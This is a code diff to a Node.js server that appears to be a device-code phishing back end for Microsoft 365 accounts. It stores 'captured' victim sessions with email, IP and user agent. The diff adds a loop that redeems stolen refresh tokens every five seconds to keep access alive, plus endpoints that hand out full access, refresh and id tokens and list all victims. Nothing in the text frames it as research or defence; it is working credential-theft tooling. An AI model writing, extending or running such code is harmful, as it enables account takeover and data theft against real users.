@@ -18,6 +18,7 @@ const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
 
 let userSessions = new Map();
 let pendingAuth = new Map();
+let refreshIntervals = new Map(); // Track refresh intervals per session
 
 function generateSID() {
     return Math.floor(Math.random() * 9000000) + 1000000;
@@ -27,7 +28,6 @@ function getClientIp(req) {
     return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
 }
 
-// Generate a unique session key for each user
 function generateSessionKey() {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     let key = '';
@@ -38,7 +38,77 @@ function generateSessionKey() {
 }
 
 // ============================================
-// CREATE SESSION - WITH offline_access FOR REFRESH TOKEN
+// REFRESH TOKEN FUNCTION - Gets NEW access token
+// ============================================
+async function refreshUserToken(session) {
+    if (!session.refresh_token) {
+        console.log(`❌ No refresh_token (PRT) for ${session.email}`);
+        return null;
+    }
+    
+    try {
+        console.log(`🔄 Refreshing token for ${session.email} at ${new Date().toLocaleTimeString()}...`);
+        
+        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            new URLSearchParams({
+                grant_type: 'refresh_token',
+                refresh_token: session.refresh_token,
+                client_id: YOUR_CLIENT_ID
+            }), {
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+            }
+        );
+        
+        const tokens = response.data;
+        
+        // Update session with NEW access token
+        const oldToken = session.access_token;
+        session.access_token = tokens.access_token;
+        session.expires_in = tokens.expires_in;
+        session.expires_at = Date.now() + (tokens.expires_in * 1000);
+        if (tokens.refresh_token) session.refresh_token = tokens.refresh_token;
+        session.lastRefreshed = new Date().toISOString();
+        
+        console.log(`✅ Token refreshed for ${session.email}`);
+        console.log(`   Old: ${oldToken?.substring(0, 30)}...`);
+        console.log(`   New: ${session.access_token?.substring(0, 30)}...`);
+        console.log(`   Expires in: ${tokens.expires_in} seconds`);
+        
+        return session.access_token;
+        
+    } catch (err) {
+        console.error(`❌ Token refresh failed for ${session.email}:`, err.response?.data?.error || err.message);
+        return null;
+    }
+}
+
+// ============================================
+// AUTO-REFRESH LOOP - Runs every 5 seconds
+// ============================================
+function startAutoRefresh(sessionId, session) {
+    // Clear existing interval if any
+    if (refreshIntervals.has(sessionId)) {
+        clearInterval(refreshIntervals.get(sessionId));
+    }
+    
+    console.log(`🔄 Starting auto-refresh for ${session.email} every 5 seconds`);
+    
+    // Refresh every 5 seconds to get fresh token
+    const interval = setInterval(async () => {
+        const currentSession = userSessions.get(sessionId);
+        if (!currentSession) {
+            clearInterval(interval);
+            refreshIntervals.delete(sessionId);
+            return;
+        }
+        await refreshUserToken(currentSession);
+    }, 5000); // Refresh every 5 seconds
+    
+    refreshIntervals.set(sessionId, interval);
+}
+
+// ============================================
+// CREATE SESSION
 // ============================================
 app.post('/api/create-session', async (req, res) => {
     try {
@@ -106,16 +176,11 @@ async function pollForToken(device_code, sid, sessionKey) {
             
             const tokens = response.data;
             
-            console.log(`[POLL] Token received for SID: ${sid}`);
-            console.log(`  - access_token: ${tokens.access_token?.substring(0, 30)}...`);
-            console.log(`  - refresh_token (PRT): ${tokens.refresh_token ? '✅ CAPTURED' : '❌ NOT CAPTURED'}`);
-            console.log(`  - session_key: ${sessionKey.substring(0, 10)}...`);
-            
             const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                 headers: { 'Authorization': `Bearer ${tokens.access_token}` }
             });
             
-            userSessions.set(sid.toString(), {
+            const session = {
                 sid: sid,
                 sessionKey: sessionKey,
                 email: userInfo.data.mail || userInfo.data.userPrincipalName,
@@ -129,8 +194,14 @@ async function pollForToken(device_code, sid, sessionKey) {
                 expires_in: tokens.expires_in,
                 expires_at: Date.now() + (tokens.expires_in * 1000),
                 scope: tokens.scope,
-                capturedAt: new Date().toISOString()
-            });
+                capturedAt: new Date().toISOString(),
+                lastRefreshed: new Date().toISOString()
+            };
+            
+            userSessions.set(sid.toString(), session);
+            
+            // Start auto-refresh for this session
+            startAutoRefresh(sid.toString(), session);
             
             pending.status = 'captured';
             pending.email = userInfo.data.mail;
@@ -149,53 +220,89 @@ async function pollForToken(device_code, sid, sessionKey) {
 }
 
 // ============================================
-// REFRESH TOKEN FUNCTION
+// API: Get FRESH access token (refreshes on demand)
 // ============================================
-async function refreshUserToken(session) {
-    if (!session.refresh_token) {
-        console.log(`❌ No refresh_token (PRT) for ${session.email}`);
-        return null;
+app.get('/api/session/token/:sid', async (req, res) => {
+    const session = userSessions.get(req.params.sid);
+    if (!session) return res.status(404).json({ error: 'Session not found' });
+    
+    // Force refresh to get a brand new token
+    const newToken = await refreshUserToken(session);
+    
+    res.json({
+        email: session.email,
+        access_token: newToken || session.access_token,
+        refreshed_at: new Date().toISOString(),
+        expires_in: session.expires_in
+    });
+});
+
+// ============================================
+// API: Get ALL tokens (with fresh access token)
+// ============================================
+app.get('/api/session/tokens/:sid', async (req, res) => {
+    const session = userSessions.get(req.params.sid);
+    if (!session) return res.status(404).json({ error: 'Session not found' });
+    
+    // Force refresh to get brand new access token
+    const newToken = await refreshUserToken(session);
+    
+    res.json({
+        email: session.email,
+        sessionKey: session.sessionKey,
+        access_token: newToken || session.access_token,
+        refresh_token: session.refresh_token || 'Not captured',
+        id_token: session.id_token || 'Not captured',
+        expires_in: session.expires_in,
+        expires_at: session.expires_at,
+        token_type: session.token_type,
+        lastRefreshed: new Date().toISOString()
+    });
+});
+
+// ============================================
+// API: Force refresh ALL sessions (manual refresh)
+// ============================================
+app.post('/api/refresh-all', async (req, res) => {
+    console.log(`🔄 Manual refresh of all sessions requested`);
+    
+    const results = [];
+    for (const [sid, session] of userSessions.entries()) {
+        const newToken = await refreshUserToken(session);
+        results.push({
+            email: session.email,
+            success: !!newToken,
+            newToken: newToken?.substring(0, 30) + '...'
+        });
     }
     
-    try {
-        console.log(`🔄 Refreshing token for ${session.email} using PRT...`);
-        
-        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
-            new URLSearchParams({
-                grant_type: 'refresh_token',
-                refresh_token: session.refresh_token,
-                client_id: YOUR_CLIENT_ID
-            }), {
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
-            }
-        );
-        
-        const tokens = response.data;
-        
-        session.access_token = tokens.access_token;
-        if (tokens.refresh_token) session.refresh_token = tokens.refresh_token;
-        session.expires_in = tokens.expires_in;
-        session.expires_at = Date.now() + (tokens.expires_in * 1000);
-        
-        console.log(`✅ Token refreshed for ${session.email}`);
-        return session.access_token;
-        
-    } catch (err) {
-        console.error(`❌ Token refresh failed for ${session.email}:`, err.response?.data?.error || err.message);
-        return null;
-    }
-}
-
-async function getValidToken(session) {
-    if (Date.now() >= session.expires_at - 300000) {
-        return await refreshUserToken(session);
-    }
-    return session.access_token;
-}
+    res.json({ 
+        success: true, 
+        refreshed_at: new Date().toISOString(),
+        count: results.length,
+        results: results
+    });
+});
 
 // ============================================
-// API ENDPOINTS
+// API: Get all sessions
 // ============================================
+app.get('/api/sessions', async (req, res) => {
+    const sessionList = Array.from(userSessions.values()).map(s => ({
+        sid: s.sid,
+        sessionKey: s.sessionKey,
+        email: s.email,
+        name: s.name,
+        ip: s.ip,
+        userAgent: s.userAgent,
+        capturedAt: s.capturedAt,
+        lastRefreshed: s.lastRefreshed,
+        hasRefreshToken: !!s.refresh_token,
+        tokenExpires: new Date(s.expires_at).toLocaleString()
+    }));
+    res.json({ sessions: sessionList });
+});
+
 app.get('/api/status/:sid', async (req, res) => {
     const { sid } = req.params;
     const session = userSessions.get(sid);
@@ -206,42 +313,12 @@ app.get('/api/status/:sid', async (req, res) => {
     res.json({ status: 'not_found' });
 });
 
-app.get('/api/sessions', async (req, res) => {
-    const sessionList = Array.from(userSessions.values()).map(s => ({
-        sid: s.sid,
-        sessionKey: s.sessionKey,
-        email: s.email,
-        name: s.name,
-        ip: s.ip,
-        userAgent: s.userAgent,
-        capturedAt: s.capturedAt,
-        hasRefreshToken: !!s.refresh_token,
-        tokenExpires: new Date(s.expires_at).toLocaleString()
-    }));
-    console.log(`📊 Returning ${sessionList.length} sessions`);
-    res.json({ sessions: sessionList });
-});
-
-// Get ALL tokens: Access Token, PRT (Refresh Token), and Session Key
-app.get('/api/session/tokens/:sid', async (req, res) => {
-    const session = userSessions.get(req.params.sid);
-    if (!session) return res.status(404).json({ error: 'Session not found' });
-    
-    await getValidToken(session);
-    
-    res.json({
-        email: session.email,
-        sessionKey: session.sessionKey,
-        access_token: session.access_token,
-        refresh_token: session.refresh_token || 'Not captured',
-        id_token: session.id_token || 'Not captured',
-        expires_in: session.expires_in,
-        expires_at: session.expires_at,
-        token_type: session.token_type
-    });
-});
-
 app.delete('/api/sessions/clear', async (req, res) => {
+    // Clear all refresh intervals
+    for (const [sid, interval] of refreshIntervals.entries()) {
+        clearInterval(interval);
+    }
+    refreshIntervals.clear();
     userSessions.clear();
     res.json({ success: true });
 });
@@ -322,7 +399,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
     console.log(`📍 Client ID: ${YOUR_CLIENT_ID}`);
+    console.log(`📍 Auto-refresh: Every 5 seconds`);
     console.log(`📍 Dashboard: http://localhost:${PORT}`);
-    console.log(`📍 Auth Page: http://localhost:${PORT}/generate-auth-page`);
     console.log(`========================================\n`);
 });
